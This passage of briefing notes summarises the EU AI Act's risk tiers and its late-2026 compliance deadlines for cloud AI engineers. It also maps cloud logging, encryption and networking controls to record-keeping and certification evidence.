- [BK] In force **1 Aug 2024**. Risk tiers: **prohibited** practices (Art. 5, e.g., social scoring, manipulative techniques, untargeted facial-image scraping, emotion recognition at work and in schools); **high-risk** (Art. 6 + Annex I product-safety legislation / Annex III use cases such as employment, credit, education, essential services, law enforcement); **transparency / "limited risk"** (Art. 50: chatbots disclose AI, deepfakes labelled, synthetic content machine-readably marked); **minimal risk**. ### Inferences
- For a cloud AI engineer in Oct 2026: **GPAI providers** (model builders) face live EU enforcement now. **Deployers building chatbots or generating content** must meet Art. 50 now, with marking by 2 Dec 2026. **High-risk use-case builders** (HR, credit, education) have a reprieve to Dec 2027 but should not stop preparing (documentation, logging, human oversight), because the obligations were deferred, not removed.
- The cloud controls in Q1/Q2 are what *evidence* governance. Invocation logs and CloudTrail cover the Art. 12 record-keeping and audit trail. KMS, VPC-SC and Private Link cover security controls for ISO 42001/SOC 2. BAAs plus ZDR configuration cover HIPAA. An AI inventory ties it together.
